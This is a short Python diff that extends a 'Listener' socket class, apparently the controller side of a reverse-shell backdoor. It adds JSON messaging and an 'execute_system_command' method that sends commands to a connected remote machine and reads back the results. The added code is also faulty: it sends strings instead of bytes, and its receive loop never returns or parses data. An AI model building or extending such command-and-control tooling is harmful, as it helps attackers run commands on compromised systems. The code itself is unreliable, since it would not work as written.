@@ -1,3 +1,4 @@
+import json
 import socket 
 from socket import AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR
 
@@ -14,6 +15,22 @@ class Listener:
 
         self.connection, address = listener.accept()
         print(f'[+] New connection from {address}')
+
+    def send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data)
+
+    def receive(self):
+        json_data = ''
+        while True:
+            try:
+                json_data += self.connection.recv(1024)
+            except ValueError:
+                continue 
+
+    def execute_system_command(self, command):
+        self.send(command)
+        return self.receive()
 
 
     def run(self):
